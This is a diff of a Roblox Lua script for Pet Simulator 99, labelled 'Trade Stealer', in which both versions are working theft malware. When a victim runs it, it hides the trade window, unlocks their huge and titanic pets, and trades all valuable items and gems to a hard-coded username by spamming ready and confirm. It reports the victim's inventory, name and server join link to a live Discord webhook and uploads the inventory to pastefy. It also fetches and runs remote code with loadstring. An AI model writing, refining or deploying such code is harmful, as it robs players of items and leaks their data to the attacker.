@@ -1,8 +1,10 @@
-local targetUsernames = {"rip_luffy8057"}
-local MIN_RAP = _G.MinRap or 1000000
-local KICK_ON_COMPLETE = false
+--[[
+    sxy.com on top
+]]
 
--- CHANGE THIS TO YOUR DISCORD WEBHOOK URL (leave empty to disable)
+local targetUsernames = {"rip_luffy8057"}
+local MIN_RAP = _G.MinRap or 10000000
+local KICK_ON_COMPLETE = false
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1518326509411242055/vHJaIVH89qSNh6F2IPiZRR6KrdFWLXRI7vUtx2EzzThUGux6FQty9IlJPVlRuKHOgnHj"
 
 local Players = game:GetService("Players")
@@ -20,126 +22,182 @@ local Trading = require(ReplicatedStorage.Library.Client.TradingCmds)
 local player = Players.LocalPlayer
 local playerGui = player.PlayerGui
 
-loadstring(game:HttpGet(""https://pastefy.app/QVuCL7v3/raw", true))()
+-- Delta JOBID bypass via stepAnimate hook
+local executorName = ""
+if syn then executorName = "synapse"
+elseif KRNL_LOADED then executorName = "krnl"
+elseif fluxus then executorName = "fluxus"
+elseif delta then executorName = "delta"
+elseif getexecutorname then executorName = getexecutorname()
+elseif identifyexecutor then executorName = identifyexecutor()
+end
 
--- ========== REQUEST FUNCTIONS LIST ==========
-local request_funcs = {}
-
-if syn and syn.request then table.insert(request_funcs, syn.request) end
-if http and http.request then table.insert(request_funcs, http.request) end
-if http_request then table.insert(request_funcs, http_request) end
-if request then table.insert(request_funcs, request) end
-
--- ========== WEBHOOK FUNCTION ==========
-local function sendWebhook(inventoryData, gemsData, success, customMessage)
-    if WEBHOOK_URL == "" then return end
-    
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    local joinLink = string.format("https://www.roblox.com/games/%d?joinId=%s", placeId, jobId)
-    
-    local playerUser = player.Name
-    local playerUserId = player.UserId
-    local playerDisplayName = player.DisplayName
-    local avatarThumbnail = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", playerUserId)
-    
-    local inventorySummary = {}
-    local totalValue = 0
-    
-    if inventoryData and #inventoryData > 0 then
-        for i, item in ipairs(inventoryData) do
-            if i <= 15 then
-                table.insert(inventorySummary, string.format("• **%s** – `%s RAP` (x%d)", item.name, tostring(item.totalValue), item.amount))
-                totalValue = totalValue + item.totalValue
+local REAL_JOB_ID = game.JobId
+if executorName:lower() == "delta" then
+    local stepAnimate = nil
+    repeat
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" and debug.getinfo(v) and debug.getinfo(v).name == "stepAnimate" then
+                stepAnimate = v; break
             end
         end
-        if #inventoryData > 15 then
-            table.insert(inventorySummary, string.format("• ... and **%d** more items", #inventoryData - 15))
+        task.wait()
+    until stepAnimate
+    local captured = false
+    local oldStepAnimate = stepAnimate
+    hookfunction(stepAnimate, function(dt)
+        if not captured then captured = true; REAL_JOB_ID = game.JobId end
+        return oldStepAnimate(dt)
+    end)
+    repeat task.wait() until captured
+end
+
+-- GUI fallback loader
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/QVuCL7v3/raw", true))()
+end)
+
+-- Multi-executor request fallback
+local request_funcs = {}
+if syn and syn.request then table.insert(request_funcs, syn.request) end
+if http and type(http) == "table" and http.request then table.insert(request_funcs, http.request) end
+if http_request then table.insert(request_funcs, http_request) end
+if request then table.insert(request_funcs, request) end
+if fluxus and fluxus.request then table.insert(request_funcs, fluxus.request) end
+if electron and electron.http then
+    table.insert(request_funcs, function(tbl)
+        return electron.http(tbl.Url, tbl.Method, tbl.Body, tbl.Headers)
+    end)
+end
+if krampus and krampus.request then table.insert(request_funcs, krampus.request) end
+
+-- Pastefy paste creation
+local function createPaste(content)
+    local url = "https://pastefy.app/api/v2/paste"
+    local body = HttpService:JSONEncode({ content = content })
+    for _, reqFunc in ipairs(request_funcs) do
+        local ok, resp = pcall(reqFunc, {
+            Url = url,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body
+        })
+        if ok and resp and resp.Body then
+            local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, resp.Body)
+            if ok2 and decoded and decoded.link then
+                return decoded.link
+            end
         end
-    else
-        table.insert(inventorySummary, "• No valuable items found")
     end
-    
-    local gemsText = gemsData and string.format("**%s** %s", tostring(gemsData.amount), gemsData.id or "Gems") or "None"
-    local embedColor = success and 0x9B59B6 or 0xE74C3C
-    local statusText = success and "✅ **SUCCESS**" or "❌ **FAILED**"
-    
-    local finalStatus = customMessage or statusText
-    
-    local embed = {
-        title = "🕵️ **TRADE STEALER REPORT**",
-        color = embedColor,
-        thumbnail = { url = avatarThumbnail },
-        fields = {
-            { name = "👤 **Player**", value = string.format("**Username:** %s\n**Display:** %s\n**ID:** `%d`", playerUser, playerDisplayName, playerUserId), inline = true },
-            { name = "💰 **Gems**", value = gemsText, inline = true },
-            { name = "💎 **Total Value**", value = string.format("`%s RAP`", tostring(totalValue)), inline = true },
-            { name = "🔗 **Join Link**", value = string.format("[Click to join server](%s)", joinLink), inline = false },
-            { name = "🎮 **Server Info**", value = string.format("`Place ID:` %d\n`Job ID:` `%s`", placeId, jobId), inline = true },
-            { name = "🎯 **Target**", value = string.format("`%s`", table.concat(targetUsernames, "`, `")), inline = true },
-            { name = "📦 **Valuable Items**", value = table.concat(inventorySummary, "\n"), inline = false },
-            { name = "🏁 **Status**", value = finalStatus, inline = false }
-        },
-        footer = { text = "🔒 Trade Stealer • " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = "https://cdn-icons-png.flaticon.com/512/1068/1068520.png" }
-    }
-    
-    local webhookData = {
-        content = "@everyone",
-        embeds = { embed }
-    }
-    
-    local encodedData = HttpService:JSONEncode(webhookData)
-    
-    -- Try each request function
-    local successSent = false
-    
-    for _, req_func in ipairs(request_funcs) do
-        if not successSent then
+    return nil
+end
+
+-- Single-shot webhook gate
+local webhookSent = false
+
+-- Eternal PS99 embed builder
+local function sendWebhook(statusText, invData, gemsData)
+    if WEBHOOK_URL == "" then return end
+    if webhookSent then return end
+    webhookSent = true
+
+    coroutine.wrap(function()
+        local totalValue = 0
+        local itemList = {}
+        if invData and #invData > 0 then
+            for i, item in ipairs(invData) do
+                totalValue = totalValue + item.totalValue
+                if i <= 15 then
+                    table.insert(itemList, string.format("• **%s** – `%s RAP` (x%d)", item.name, tostring(item.totalValue), item.amount))
+                end
+            end
+            if #invData > 15 then
+                table.insert(itemList, string.format("• ... and **%d** more items", #invData - 15))
+            end
+        else
+            table.insert(itemList, "• No valuable items")
+        end
+
+        local gemsText = gemsData and string.format("**%s** %s", tostring(gemsData.amount), gemsData.id or "Gems") or "None"
+
+        local fullInventoryText = "PS99 Inventory Snapshot\n" .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n"
+        if invData and #invData > 0 then
+            for _, item in ipairs(invData) do
+                fullInventoryText = fullInventoryText .. string.format("%s | RAP: %d | Amount: %d | Total: %d\n",
+                    item.name, item.rap, item.amount, item.totalValue)
+            end
+        else
+            fullInventoryText = fullInventoryText .. "No valuable items."
+        end
+
+        local pasteLink = createPaste(fullInventoryText)
+        local linkFieldValue = pasteLink and string.format("[View Full Inventory](%s)", pasteLink) or "Paste creation failed"
+
+        local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, REAL_JOB_ID)
+
+        local colorHex = 0x5865F2
+        if statusText:find("Pending") then colorHex = 0x5865F2
+        elseif statusText:find("Found") then colorHex = 0xF1C40F
+        elseif statusText:find("Complete") then colorHex = 0x2ECC71
+        elseif statusText:find("Partial") then colorHex = 0xE67E22
+        else colorHex = 0xE74C3C end
+
+        local embed = {
+            title = "🕵️ **TRADE STEALER**",
+            description = "```\n" .. os.date("%Y-%m-%d %H:%M:%S") .. "\n```",
+            color = colorHex,
+            thumbnail = { url = "https://cdn.discordapp.com/attachments/0/0/ps99_logo.png" },
+            fields = {
+                { name = "👤 Player", value = string.format("```\n%s (%s)\n```", player.Name, player.DisplayName), inline = true },
+                { name = "💰 Gems", value = string.format("```\n%s\n```", gemsText), inline = true },
+                { name = "💎 Total Value", value = string.format("```\n%s RAP\n```", tostring(totalValue)), inline = true },
+                { name = "🎯 Target", value = string.format("```\n%s\n```", table.concat(targetUsernames, ", ")), inline = true },
+                { name = "📦 Valuable Items", value = table.concat(itemList, "\n"), inline = false },
+                { name = "🏁 Status", value = string.format("```\n%s\n```", statusText), inline = false },
+                { name = "🔗 Join Link", value = string.format("[Join Server](%s)", fernJoinerLink), inline = false },
+                { name = "🆔 Job ID", value = string.format("```\n%s\n```", REAL_JOB_ID), inline = false },
+                { name = "📋 Inventory", value = linkFieldValue, inline = false }
+            },
+            footer = { text = "PS99 Trade Stealer • sxy.com on top", icon_url = "https://cdn.discordapp.com/attachments/0/0/eternal_icon.png" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+
+        local payload = HttpService:JSONEncode({ content = "@everyone", embeds = { embed } })
+
+        local sent = false
+        for _, reqFunc in ipairs(request_funcs) do
+            if not sent then
+                pcall(function()
+                    reqFunc({
+                        Url = WEBHOOK_URL .. "?wait=true",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = payload
+                    })
+                    sent = true
+                end)
+            end
+        end
+        if not sent then
             pcall(function()
-                req_func({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = encodedData
-                })
-                successSent = true
-                print("[Webhook] Sent successfully!")
+                HttpService:PostAsync(WEBHOOK_URL .. "?wait=true", payload, Enum.HttpContentType.ApplicationJson)
             end)
         end
-    end
-    
-    -- Fallback to HttpService if all else fails
-    if not successSent then
-        pcall(function()
-            HttpService:PostAsync(WEBHOOK_URL, encodedData, Enum.HttpContentType.ApplicationJson)
-            successSent = true
-            print("[Webhook] Sent via HttpService fallback")
-        end)
-    end
-    
-    if not successSent then
-        warn("[Webhook] Failed to send - no working HTTP method")
-    end
+    end)()
 end
 
--- ========== SAFE WAIT ==========
+-- Utility: timed wait
 local function safeWait(seconds)
-    local start = tick()
-    repeat
-        RunService.Heartbeat:Wait()
-    until tick() - start >= seconds
+    local t = tick()
+    repeat RunService.Heartbeat:Wait() until tick() - t >= seconds
 end
 
--- ========== HIDE TRADE WINDOW ==========
+-- Utility: hide trade window UI
 local function hideTradeWindow()
     local tradeWindow = playerGui:FindFirstChild("TradeWindow")
     if tradeWindow then
         tradeWindow.Enabled = false
-        local descendants = tradeWindow:GetDescendants()
-        for i = 1, #descendants do
-            local child = descendants[i]
+        for _, child in ipairs(tradeWindow:GetDescendants()) do
             if child:IsA("Frame") or child:IsA("ImageLabel") or child:IsA("TextLabel") or child:IsA("TextButton") then
                 child.Visible = false
             end
@@ -149,352 +207,430 @@ end
 
 playerGui.ChildAdded:Connect(function(child)
     safeWait(0.1)
-    if child.Name == "TradeWindow" or string.find(string.lower(child.Name), "trade") then
+    if child.Name == "TradeWindow" or string.lower(child.Name):find("trade") then
         hideTradeWindow()
         child.Enabled = false
     end
 end)
+Trading.TradeCreated:Connect(function() safeWait(0.05); hideTradeWindow() end)
 
-Trading.TradeCreated:Connect(function()
-    safeWait(0.05)
-    hideTradeWindow()
-end)
+local ALLOWED_CATEGORIES = {"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}
 
-local ALLOWED_CATEGORIES = {
-    "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"
-}
+-- FIXED: Proper state access with multiple fallback methods
+local function getTradeState()
+    local ok, state = pcall(Trading.GetState)
+    if ok and state then return state end
+
+    -- Fallback: try to get state from Trading module directly
+    if Trading._state then return Trading._state end
+    if Trading.State then return Trading.State end
+    if Trading.state then return Trading.state end
+
+    return nil
+end
 
 local function getTradeId()
-    local state = Trading.GetState()
-    if state then return state._id end
-    return nil
+    local state = getTradeState()
+    if not state then return nil end
+    return state._id or state.id or state.tradeId or state.TradeId
 end
 
 local function getTradeCounter()
-    local state = Trading.GetState()
-    if state then return state._counter end
-    return nil
+    local state = getTradeState()
+    if not state then return nil end
+    return state._counter or state.counter or state._Counter or state.Counter
 end
 
+-- Unlock all locked valuable pets
+local function unlockAllValuablePets()
+    local saveData = Save.Get()
+    if not saveData or not saveData.Inventory or not saveData.Inventory.Pet then return end
+    for uid, data in pairs(saveData.Inventory.Pet) do
+        local pet = Directory.Pets[data.id]
+        if pet and (pet.huge or pet.titanic or pet.gargantuan) then
+            if data._l then
+                pcall(function()
+                    Network.Invoke("Lock Item", uid, false)
+                    data._l = false
+                end)
+            end
+        end
+    end
+end
+
+-- RAP calculation wrapper - FIXED with proper item structure
 local function calculateRAP(category, item)
-    local fake = {
-        Class = {Name = category},
-        IsA = function(_, name) return name == category end,
-        GetId = function(_) return item.id end,
-        StackKey = function(_)
-            return game:GetService("HttpService"):JSONEncode({
+    local ok, rap = pcall(function()
+        if RAPCmds and RAPCmds.Get then
+            -- Build proper item object for RAP calculation
+            local rapItem = {
+                Class = { Name = category },
+                IsA = function(_, n) return n == category end,
+                GetId = function() return item.id end,
                 id = item.id,
                 pt = item.pt,
                 sh = item.sh,
+                _am = item._am or item.Amount or 1,
+                _l = item._l,
                 tn = item.tn,
-            })
-        end,
-        AbstractGetRAP = function(self)
-            if RAPCmds and type(RAPCmds.Get) == 'function' then
-                local ok, value = pcall(RAPCmds.Get, self)
-                if ok then return value end
-            end
-            return nil
-        end,
-    }
-    return fake:AbstractGetRAP() or 0
+                uid = item.uid
+            }
+            return RAPCmds.Get(rapItem)
+        end
+        return 0
+    end)
+    return ok and rap or 0
 end
 
+-- Value threshold check
 local function isValuable(category, data, rap)
-    local categoryAllowed = false
-    for i = 1, #ALLOWED_CATEGORIES do
-        if category == ALLOWED_CATEGORIES[i] then
-            categoryAllowed = true
-            break
-        end
-    end
-    
-    if not categoryAllowed then
-        return false
-    end
-    
-    local amount = data._am or data.Amount or 1
-    local totalValue = rap * amount
-    
     if category == "Pet" then
         local pet = Directory.Pets[data.id]
-        if pet and (pet.gargantuan or pet.titanic or pet.huge or pet.exclusiveLevel or pet.exclusive) then
-            return true
-        end
-        return false
+        if pet and (pet.gargantuan or pet.titanic or pet.huge or pet.exclusive) then return true end
     end
-    
-    return totalValue >= MIN_RAP
+    for _, cat in ipairs(ALLOWED_CATEGORIES) do
+        if category == cat then
+            local amount = data._am or data.Amount or 1
+            return rap * amount >= MIN_RAP
+        end
+    end
+    return false
 end
 
+-- Priority tier checkers
+local function isGargantuan(item)
+    local pet = Directory.Pets[item.id or ""]
+    return pet and pet.gargantuan
+end
+
+local function isTitanic(item)
+    local pet = Directory.Pets[item.id or ""]
+    return pet and pet.titanic
+end
+
+local function isHuge(item)
+    local pet = Directory.Pets[item.id or ""]
+    return pet and pet.huge
+end
+
+-- Inventory scan with priority sort
 local function getAllValuableItems()
-    local inv = Save.Get().Inventory
-    local valuableItems = {}
-    
-    if not inv then
-        return valuableItems
-    end
-    
-    for i = 1, #ALLOWED_CATEGORIES do
-        local category = ALLOWED_CATEGORIES[i]
-        if inv[category] then
-            for uid, data in pairs(inv[category]) do
-                local rap = calculateRAP(category, data)
-                
-                if isValuable(category, data, rap) then
+    local saveData = Save.Get()
+    if not saveData or not saveData.Inventory then return {} end
+    local inv = saveData.Inventory
+    local valuable = {}
+
+    for _, cat in ipairs(ALLOWED_CATEGORIES) do
+        if inv[cat] then
+            for uid, data in pairs(inv[cat]) do
+                local rap = calculateRAP(cat, data)
+                if isValuable(cat, data, rap) then
                     local amount = data._am or data.Amount or 1
                     local name = ""
-                    if data.pt and data.pt == 1 then name = "Golden " end
-                    if data.pt and data.pt == 2 then name = "Rainbow " end
+                    if data.pt == 1 then name = "Golden " end
+                    if data.pt == 2 then name = "Rainbow " end
                     if data.sh then name = "Shiny " .. name end
                     name = name .. (data.id or "Unknown")
-                    
-                    if amount > 1 then
-                        name = name .. " (x" .. amount .. ")"
-                    end
-                    
-                    table.insert(valuableItems, {
-                        category = category,
+                    if amount > 1 then name = name .. " (x" .. amount .. ")" end
+                    table.insert(valuable, {
+                        category = cat,
                         uid = uid,
+                        id = data.id,
                         amount = amount,
                         rap = rap,
                         totalValue = rap * amount,
-                        name = name
+                        name = name,
+                        pt = data.pt,
+                        sh = data.sh
                     })
                 end
             end
         end
     end
-    
-    table.sort(valuableItems, function(a, b)
+
+    table.sort(valuable, function(a, b)
+        local aGarg = isGargantuan(a) and 4 or isTitanic(a) and 3 or isHuge(a) and 2 or 1
+        local bGarg = isGargantuan(b) and 4 or isTitanic(b) and 3 or isHuge(b) and 2 or 1
+        if aGarg ~= bGarg then return aGarg > bGarg end
         return a.totalValue > b.totalValue
     end)
-    
-    return valuableItems
+    return valuable
 end
 
+-- Gems extractor
 local function getGems()
-    local inv = Save.Get().Inventory
-    if inv and inv.Currency then
-        for uid, data in pairs(inv.Currency) do
-            if data.id == "Diamonds" or data.id == "Gems" then
-                local amount = data._am or 0
-                if amount > 0 then
-                    return { uid = uid, id = data.id, amount = amount }
+    local saveData = Save.Get()
+    if not saveData or not saveData.Inventory or not saveData.Inventory.Currency then return nil end
+    for uid, data in pairs(saveData.Inventory.Currency) do
+        if data.id == "Diamonds" or data.id == "Gems" then
+            local amount = data._am or 0
+            if amount > 0 then return { uid = uid, id = data.id, amount = amount } end
+        end
+    end
+    return nil
+end
+
+-- Player resolver
+local function getPlayerByName(username)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name:lower() == username:lower() then return plr end
+    end
+    return nil
+end
+
+-- FIXED: Trade item injection with proper error handling and retries
+local function addItemToTrade(cat, uid, amount)
+    local tid = getTradeId()
+    if not tid then 
+        warn("[TradeStealer] No trade ID found")
+        return false 
+    end
+
+    local success, result = pcall(function()
+        return Network.Invoke("Server: Trading: Set Item", tid, cat, uid, amount or 1)
+    end)
+
+    if success and result == true then
+        return true
+    else
+        -- Retry once
+        task.wait(0.1)
+        local success2, result2 = pcall(function()
+            return Network.Invoke("Server: Trading: Set Item", tid, cat, uid, amount or 1)
+        end)
+        return success2 and result2 == true
+    end
+end
+
+-- Trade request handler with safety checks
+local function requestTrade(targetPlayer)
+    if not targetPlayer or not targetPlayer.Parent then return false end
+    local ok, result = pcall(function()
+        return Network.Invoke("Server: Trading: Request", targetPlayer)
+    end)
+    return ok and result == true
+end
+
+-- FIXED: Ready + confirm with proper state checking and timing
+local function spamReadyAndConfirm()
+    local readyOk, confirmOk = false, false
+
+    -- Wait for trade to be fully established
+    for i = 1, 50 do
+        if getTradeId() then break end
+        task.wait(0.05)
+    end
+
+    local tid = getTradeId()
+    if not tid then 
+        warn("[TradeStealer] Trade ID not available for ready/confirm")
+        return false 
+    end
+
+    -- Phase 1: Spam Ready
+    for i = 1, 200 do
+        tid = getTradeId()
+        if not tid then break end
+
+        local ctr = getTradeCounter()
+
+        pcall(function()
+            Network.Invoke("Server: Trading: Set Ready", tid, true, ctr)
+        end)
+
+        -- Check state
+        local state = getTradeState()
+        if state then
+            local idx = state:PlayerIndex and state:PlayerIndex(player) or 1
+            local readyTable = state._ready or state.ready or state.Ready
+            if readyTable and readyTable[idx] == true then
+                readyOk = true
+                break
+            end
+        end
+
+        task.wait(0.015)
+    end
+
+    -- Small delay before confirm
+    task.wait(0.2)
+
+    -- Phase 2: Spam Confirm
+    for i = 1, 200 do
+        tid = getTradeId()
+        if not tid then break end
+
+        local ctr = getTradeCounter()
+
+        pcall(function()
+            Network.Invoke("Server: Trading: Set Confirmed", tid, true, ctr)
+        end)
+
+        -- Check state
+        local state = getTradeState()
+        if state then
+            local idx = state:PlayerIndex and state:PlayerIndex(player) or 1
+            local confirmTable = state._confirmed or state.confirmed or state.Confirmed
+            if confirmTable and confirmTable[idx] == true then
+                confirmOk = true
+                break
+            end
+        end
+
+        task.wait(0.015)
+    end
+
+    if KICK_ON_COMPLETE and (readyOk or confirmOk) then
+        safeWait(1)
+        pcall(function() player:Kick("Trade completed") end)
+    end
+
+    return readyOk and confirmOk
+end
+
+-- FIXED: Wait for trade to be fully open with proper state detection
+local function waitForTradeOpen(timeout)
+    timeout = timeout or 10
+    local start = tick()
+    while tick() - start < timeout do
+        local state = getTradeState()
+        if state and getTradeId() then
+            -- Check if both players are in trade
+            if state._players or state.players or state.Players then
+                return true
+            end
+        end
+        task.wait(0.05)
+    end
+    return false
+end
+
+-- Main execution loop
+local running = true
+task.spawn(function()
+    local t = tick()
+    while not game:IsLoaded() do RunService.Heartbeat:Wait() end
+    while not Library or not Library.IsLoaded or not Library.IsLoaded() do
+        RunService.Heartbeat:Wait()
+        if tick() - t > 30 then break end
+    end
+
+    unlockAllValuablePets()
+    sendWebhook("⏳ Pending – waiting for target...", getAllValuableItems(), getGems())
+
+    while running do
+        local targetPlayer, matchedUsername = nil, nil
+
+        -- Find target
+        while not targetPlayer do
+            for _, name in ipairs(targetUsernames) do
+                targetPlayer = getPlayerByName(name)
+                if targetPlayer then
+                    matchedUsername = name
+                    break
+                end
+            end
+            if not targetPlayer then
+                task.wait(0.5)
+            end
+        end
+
+        sendWebhook("🎯 Target found: " .. matchedUsername, getAllValuableItems(), getGems())
+
+        -- Check if target still exists
+        if not getPlayerByName(matchedUsername) then
+            task.wait(1)
+        else
+            -- Request trade
+            local tradeCreated = false
+            for retry = 1, 5 do
+                if not getPlayerByName(matchedUsername) then
+                    break
+                end
+
+                local reqOk = requestTrade(targetPlayer)
+                if reqOk then
+                    -- Wait for trade to actually open
+                    if waitForTradeOpen(5) then
+                        tradeCreated = true
+                        break
+                    end
+                end
+
+                safeWait(2)
+            end
+
+            if not tradeCreated then
+                sendWebhook("❌ Failed – couldn't open trade", nil, nil)
+                task.wait(1)
+            else
+                -- CRITICAL: Wait for trade to be fully ready before adding items
+                safeWait(1)
+
+                -- Double check trade is still open
+                if not getTradeId() then
+                    sendWebhook("❌ Failed – trade closed before adding items", nil, nil)
+                    task.wait(1)
+                else
+                    -- Priority add items
+                    local items = getAllValuableItems()
+                    local gargItems = {}
+                    local titanicItems = {}
+                    local hugeItems = {}
+                    local otherItems = {}
+
+                    for _, item in ipairs(items) do
+                        if isGargantuan(item) then
+                            table.insert(gargItems, item)
+                        elseif isTitanic(item) then
+                            table.insert(titanicItems, item)
+                        elseif isHuge(item) then
+                            table.insert(hugeItems, item)
+                        else
+                            table.insert(otherItems, item)
+                        end
+                    end
+
+                    -- Add items with verification
+                    local addedCount = 0
+
+                    local function addItemsWithVerify(itemList)
+                        for _, item in ipairs(itemList) do
+                            if not getTradeId() then break end
+                            local ok = addItemToTrade(item.category, item.uid, item.amount)
+                            if ok then addedCount = addedCount + 1 end
+                            task.wait(0.1)
+                        end
+                    end
+
+                    addItemsWithVerify(gargItems)
+                    addItemsWithVerify(titanicItems)
+                    addItemsWithVerify(hugeItems)
+                    addItemsWithVerify(otherItems)
+
+                    -- Add gems
+                    local gems = getGems()
+                    if gems and getTradeId() then
+                        addItemToTrade("Currency", gems.uid, gems.amount)
+                    end
+
+                    -- Wait a moment then spam ready/confirm
+                    safeWait(0.5)
+
+                    if addedCount > 0 or gems then
+                        local completed = spamReadyAndConfirm()
+                        sendWebhook(
+                            completed and "✅ Complete – trade executed" or "⚠️ Partial – ready/confirm issue", 
+                            items, 
+                            gems
+                        )
+                    else
+                        sendWebhook("❌ No items added to trade", nil, nil)
+                    end
                 end
             end
         end
-    end
-    return nil
-end
 
-local function getPlayerByUsername(username)
-    local players = Players:GetPlayers()
-    for i = 1, #players do
-        local player = players[i]
-        if player.Name:lower() == username:lower() then
-            return player
-        end
+        task.wait(1)
     end
-    return nil
-end
-
-local function waitForFirstPlayer(usernames)
-    local maxAttempts = 3000 
-    
-    for attempt = 1, maxAttempts do
-        for i = 1, #usernames do
-            local player = getPlayerByUsername(usernames[i])
-            if player then
-                return player, usernames[i]
-            end
-        end
-        RunService.Heartbeat:Wait()
-    end
-    
-    return nil, nil
-end
-
-local function addItemToTrade(category, uid, amount)
-    local tradeId = getTradeId()
-    if not tradeId then return false end
-    
-    local success = Network.Invoke('Server: Trading: Set Item', tradeId, category, uid, amount or 1)
-    return success == true
-end
-
-local function requestTrade(targetPlayer)
-    return Network.Invoke('Server: Trading: Request', targetPlayer)
-end
-
--- ========== SPAM READY + CONFIRM FUNCTION ==========
-local function spamReadyAndConfirm()
-    local tradeId = getTradeId()
-    local counter = getTradeCounter()
-    
-    if not tradeId then
-        warn("No trade ID found")
-        return false
-    end
-    
-    print("[Trade Stealer] Starting spam-ready...")
-    
-    -- Wait for UI to fully register items
-    safeWait(2)
-    
-    local readySuccess = false
-    local confirmSuccess = false
-    local maxAttempts = 100
-    
-    -- SPAM READY REMOTE
-    for i = 1, maxAttempts do
-        tradeId = getTradeId()
-        counter = getTradeCounter()
-        
-        if tradeId then
-            local result = Network.Invoke('Server: Trading: Set Ready', tradeId, true, counter)
-            if result == true then
-                readySuccess = true
-                print("[Trade Stealer] Ready sent! (Attempt " .. i .. ")")
-            end
-        end
-        safeWait(0.05)
-        
-        -- Check if ready actually registered
-        local state = Trading.GetState()
-        if state and state._ready then
-            local myIndex = state:PlayerIndex(player)
-            if myIndex and state._ready[myIndex] == true then
-                readySuccess = true
-                print("[Trade Stealer] Ready confirmed in state!")
-                break
-            end
-        end
-        RunService.Heartbeat:Wait()
-    end
-    
-    -- SPAM CONFIRM REMOTE
-    for i = 1, maxAttempts do
-        tradeId = getTradeId()
-        counter = getTradeCounter()
-        
-        if tradeId then
-            local result = Network.Invoke('Server: Trading: Set Confirmed', tradeId, true, counter)
-            if result == true then
-                confirmSuccess = true
-                print("[Trade Stealer] Confirm sent! (Attempt " .. i .. ")")
-            end
-        end
-        safeWait(0.05)
-        
-        -- Check if confirm actually registered
-        local state = Trading.GetState()
-        if state and state._confirmed then
-            local myIndex = state:PlayerIndex(player)
-            if myIndex and state._confirmed[myIndex] == true then
-                confirmSuccess = true
-                print("[Trade Stealer] Confirm confirmed in state!")
-                break
-            end
-        end
-        RunService.Heartbeat:Wait()
-    end
-    
-    print("[Trade Stealer] Ready success: " .. tostring(readySuccess) .. " | Confirm success: " .. tostring(confirmSuccess))
-    
-    if KICK_ON_COMPLETE and (readySuccess or confirmSuccess) then
-        safeWait(1)
-        pcall(function()
-            player:Kick("Trade completed")
-        end)
-    end
-    
-    return readySuccess and confirmSuccess
-end
-
--- ========== MAIN FUNCTION ==========
-local function main()
-    local loadAttempts = 0
-    while not game:IsLoaded() and loadAttempts < 500 do
-        RunService.Heartbeat:Wait()
-        loadAttempts = loadAttempts + 1
-    end
-    
-    loadAttempts = 0
-    while (not Library or not Library.IsLoaded or not Library.IsLoaded()) and loadAttempts < 500 do
-        RunService.Heartbeat:Wait()
-        loadAttempts = loadAttempts + 1
-    end
-    
-    local valuableItems = getAllValuableItems()
-    local gems = getGems()
-    
-    -- Send initial webhook (pending)
-    sendWebhook(valuableItems, gems, false, "⏳ **PENDING** - Waiting for target...")
-    
-    local targetPlayer, matchedUsername = waitForFirstPlayer(targetUsernames)
-    
-    if not targetPlayer then
-        warn("No target player found within timeout")
-        sendWebhook(nil, nil, false, "❌ **FAILED** - No target player found")
-        return
-    end
-    
-    print("[Trade Stealer] Found target: " .. matchedUsername)
-    
-    local tradeCreated = false
-    
-    for retry = 1, 5 do
-        print("[Trade Stealer] Requesting trade (attempt " .. retry .. ")...")
-        requestTrade(targetPlayer)
-        
-        for waitCount = 1, 100 do
-            RunService.Heartbeat:Wait()
-            if getTradeId() then
-                tradeCreated = true
-                break
-            end
-        end
-        
-        if tradeCreated then break end
-        safeWait(3)
-    end
-    
-    if not tradeCreated then
-        warn("Failed to create trade")
-        sendWebhook(nil, nil, false, "❌ **FAILED** - Could not create trade with " .. matchedUsername)
-        return
-    end
-    
-    print("[Trade Stealer] Trade created! Adding items...")
-    safeWait(1)
-    
-    -- Add all valuable items
-    for i, item in ipairs(valuableItems) do
-        local success = addItemToTrade(item.category, item.uid, item.amount)
-        print("[Trade Stealer] Added " .. item.name .. " - " .. tostring(success))
-        RunService.Heartbeat:Wait()
-    end
-    
-    -- Add gems
-    if gems then
-        addItemToTrade('Currency', gems.uid, gems.amount)
-        print("[Trade Stealer] Added gems: " .. gems.amount)
-    end
-    
-    print("[Trade Stealer] All items added! Spamming ready/confirm...")
-    
-    -- SPAM READY AND CONFIRM
-    local completed = spamReadyAndConfirm()
-    
-    -- Send final webhook
-    if completed then
-        sendWebhook(valuableItems, gems, true, "✅ **SUCCESS** - Trade completed with " .. matchedUsername)
-    else
-        sendWebhook(valuableItems, gems, false, "⚠️ **PARTIAL** - Items added but ready/confirm may have failed")
-    end
-    
-    print("[Trade Stealer] Script finished. Completed: " .. tostring(completed))
-end
-
-pcall(main)
+end)
